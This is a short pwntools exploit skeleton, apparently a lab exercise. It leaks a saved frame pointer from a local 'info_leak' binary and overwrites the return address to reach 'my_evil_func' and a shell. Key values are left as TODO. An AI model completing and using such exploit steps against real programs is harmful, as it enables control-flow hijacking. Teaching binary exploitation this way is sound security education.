#!/usr/bin/env python

from pwn import *

binary = "./info_leak"

context.binary = binary
io = process(binary)

# Determine my_evil_func address:
#    nm info_leak | grep ' my_evil_func'
evil_func_address = # TODO

# Send 32 bytes to trigger leak. Extract leaked information.
io.send(32*b"A")
out = io.recvline()

# From the output string (from the `out' variable) extract the leak.
# The leak starts at char index TODO and uses 4 bytes.
old_rbp = unpack(#TODO, 'all')
log.info("old_rbp is 0x{:08x}".format(old_rbp))
ret_address_address = # TODO
log.info("return address is located at is 0x{:08x}".format(ret_address_address))

# Overwrite return address with address of my_evil_func. The program
# issues two read() calls.
# TODO

# Interactive and shell :)
io.interactive()
